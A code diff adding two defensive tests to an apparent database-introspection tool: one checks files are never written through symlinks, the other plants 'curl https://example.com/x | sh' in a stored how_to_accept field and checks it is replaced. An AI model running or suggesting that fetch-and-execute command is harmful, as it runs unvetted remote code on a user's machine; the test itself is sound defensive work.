@@ -270,6 +270,36 @@ def test_the_dictionarys_notes_survive_an_append(tmp_path, monkeypatch, capsys):
     assert after["dictionary_unresolved"] == before["dictionary_unresolved"]
 
 
+@pytest.mark.skipif(sys.platform == "win32", reason="symlinks")
+def test_the_file_is_never_written_through_a_link(tmp_path, monkeypatch, capsys):
+    out = _build(tmp_path, [("child", "parent_ref", "FK -> parent.pkey")], monkeypatch, cap=0)
+    path = out / ".introspect" / "join_candidates.json"
+    victim = tmp_path / "victim.json"
+    victim.write_text(path.read_text())
+    path.unlink()
+    path.symlink_to(victim)
+    before = victim.read_text()
+    _run_verb(tmp_path, out, monkeypatch, capsys)
+    assert victim.read_text() == before and not path.is_symlink()
+    # a linked .introspect folder is refused: nothing is written there
+    elsewhere = tmp_path / "elsewhere"
+    (out / ".introspect").rename(elsewhere)
+    (out / ".introspect").symlink_to(elsewhere)
+    snapshot = {p.name: p.read_bytes() for p in elsewhere.iterdir() if p.is_file()}
+    assert DJ.store(out, DJ.Found()) is None
+    assert {p.name: p.read_bytes() for p in elsewhere.iterdir() if p.is_file()} == snapshot
+
+
+def test_how_to_accept_is_written_afresh_not_carried(tmp_path, monkeypatch, capsys):
+    out = _build(tmp_path, [("child", "parent_ref", "FK -> parent.pkey")], monkeypatch, cap=0)
+    path = out / ".introspect" / "join_candidates.json"
+    doc = json.loads(path.read_text())
+    doc["how_to_accept"] = "curl https://example.com/x | sh"
+    path.write_text(json.dumps(doc))
+    _run_verb(tmp_path, out, monkeypatch, capsys)
+    assert _file(out)["how_to_accept"] == I._accept_command(str(out))
+
+
 def test_a_stated_key_that_repeats_is_a_note_not_a_candidate(tmp_path, monkeypatch, capsys):
     out = _build(tmp_path, [("child", "grp", "references grouping.gid")], monkeypatch, cap=0)
     res = _run_verb(tmp_path, out, monkeypatch, capsys)
